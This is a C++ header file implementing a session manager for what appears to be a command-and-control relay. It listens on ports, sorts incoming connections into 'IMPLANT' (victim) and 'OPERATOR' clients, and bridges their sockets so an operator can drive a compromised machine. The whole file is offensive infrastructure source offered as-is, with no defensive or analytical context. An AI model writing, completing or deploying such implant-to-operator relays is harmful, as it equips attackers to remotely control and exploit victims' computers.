#pragma once

#include "Logger.hpp"
#include <Remote.hpp>
#include <Server.hpp>
#include <cstdint>
#include <map>
#include <memory>
#include <string>
#include <thread>
#include <mutex>

//--------------------------------
//
//--------------------------------
class SessionManager {
private:

    SessionManager() = default;
    ~SessionManager() = default;
    SessionManager(const SessionManager&) = delete;
    SessionManager& operator=(const SessionManager&) = delete;

    std::map<uint16_t, std::jthread> listeners;
    std::mutex mtx;
    std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_operators;
    std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_victims;

public:
    //--------------------------------
    //
    //--------------------------------
    static SessionManager& instance() {
        static SessionManager instance;
        return instance;
    }

    //--------------------------------
    //
    //--------------------------------
    bool start_listener(uint16_t port) {
        std::lock_guard lock(mtx);
        if (listeners.contains(port)) return false;

        listeners[port] = std::jthread([this, port](std::stop_token stoken) {
            cpppwn::Server server(port);

            while (not stoken.stop_requested()) {
                auto conn = server.accept();
                this->handle_new_connection(std::move(conn), port);
            }
        });
        return true;
    }

    //--------------------------------
    //
    //--------------------------------
    void handle_new_connection(std::unique_ptr<cpppwn::Remote>&& conn, int64_t port) {
        std::thread([this, conn_ptr = std::move(conn), port]() mutable -> void {
            try {
                std::string ident = conn_ptr->recvline();
                if (ident.empty()) return;

                std::lock_guard lock(mtx);

                if (ident.starts_with("IMPLANT")) {
                    if (waiting_operators.contains(port)) {
                        bridge_sockets(std::move(conn_ptr), std::move(waiting_operators[port]));
                        waiting_operators.erase(port);
                    } else {
                        waiting_victims[port] = std::move(conn_ptr);
                        logger::info("Implant linked to Port: {}", port);
                    }
                } else if (ident.starts_with("OPERATOR")) {
                    if (waiting_victims.contains(port)) {
                        bridge_sockets(std::move(waiting_victims[port]), std::move(conn_ptr));
                        waiting_victims.erase(port);
                    } else {
                        waiting_operators[port] = std::move(conn_ptr);
                        logger::info("Operator waiting for Victim on Port: {}", port);
                    }
                }
            } catch (const std::exception& e) {
                logger::warn("Connection handler failed: {}", e.what());
            }
        }).detach();
    }

    //--------------------------------
    //
    //--------------------------------
    void bridge_sockets(std::unique_ptr<cpppwn::Remote>&& a_ptr, std::unique_ptr<cpppwn::Remote>&& b_ptr) {
        //
        std::thread([a = std::move(a_ptr), b = std::move(b_ptr)]() -> void {
            logger::success("Bridging established between Implant and Operator.");

            while (a->is_alive() && b->is_alive()) {
                // Check if data exists to avoid blocking indefinitely in some pwn libs
                b->send(a->recvall());
                a->send(b->recvall());

                std::this_thread::sleep_for(std::chrono::milliseconds(5));
            }
            logger::warn("Bridge closed: One or both parties disconnected.");
        }).detach();
    }

    //--------------------------------
    //
    //--------------------------------
    void stop_listener(uint16_t port) {
        std::lock_guard lock(mtx);
        listeners.erase(port); // jthread cleans itself up
    }
};